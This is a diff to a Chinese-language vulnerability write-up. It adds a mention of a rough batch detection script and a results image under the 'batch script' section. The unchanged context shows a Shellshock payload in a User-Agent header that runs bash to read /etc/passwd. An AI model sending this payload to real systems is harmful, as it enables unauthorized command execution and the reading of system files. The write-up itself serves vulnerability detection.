@@ -27,7 +27,8 @@ User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
 ![image](./0.png)
 
 # 0x05 批量脚本
-无
+批量脚本见batch-detect.py（脚本很简陋，正在写脚本时，领导又给了一个渗透的任务，实在没时间了。。），执行结果如下：  
+![image](./1.png)
 
 # 0x06 参考链接
 https://github.com/darrenmartyn/VisualDoor/blob/main/visualdoor.py
